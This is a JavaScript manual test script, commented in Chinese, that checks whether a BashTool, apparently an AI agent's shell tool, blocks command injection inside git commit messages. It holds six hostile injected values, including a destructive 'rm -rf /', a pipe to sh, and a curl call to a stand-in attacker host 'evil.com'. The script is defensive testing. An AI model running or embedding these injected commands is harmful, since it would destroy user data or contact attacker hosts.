/**
 * 手动测试脚本：友好错误处理
 * 用于演示修复 2.1.3 的效果
 */

import { BashTool } from '../dist/tools/bash.js';

console.log('='.repeat(80));
console.log('友好错误处理演示 - 修复 2.1.3');
console.log('='.repeat(80));
console.log();

const bashTool = new BashTool();

// 测试用例
const testCases = [
  {
    name: 'Test 1: $() 命令替换',
    command: 'git commit -m "test $(whoami)"',
  },
  {
    name: 'Test 2: ${} 变量替换（新增检测）',
    command: 'git commit -m "test ${USER}"',
  },
  {
    name: 'Test 3: 反引号命令替换',
    command: 'git commit -m "test `id`"',
  },
  {
    name: 'Test 4: 分号命令分隔',
    command: 'git commit -m "test; rm -rf /"',
  },
  {
    name: 'Test 5: 管道操作',
    command: 'git commit -m "test | sh"',
  },
  {
    name: 'Test 6: 逻辑操作符',
    command: 'git commit -m "test && curl http://evil.com"',
  },
];

// 运行测试
for (const testCase of testCases) {
  console.log('-'.repeat(80));
  console.log(`📝 ${testCase.name}`);
  console.log(`   命令: ${testCase.command}`);
  console.log();

  try {
    const result = await bashTool.execute({
      command: testCase.command,
      description: testCase.name,
    });

    if (result.success) {
      console.log('✅ 命令执行成功（不应该发生）');
    } else {
      console.log('🛡️  命令被阻止（符合预期）');
      console.log();
      console.log('错误消息:');
      console.log(result.error);
    }
  } catch (error) {
    console.log('❌ 抛出异常（不应该发生）:');
    console.log(error.message);
  }

  console.log();
}

console.log('='.repeat(80));
console.log('测试完成');
console.log('='.repeat(80));
console.log();
console.log('✅ 所有危险命令都被安全拦截');
console.log('✅ 用户收到友好的错误提示');
console.log('✅ 系统未抛出未捕获的异常');
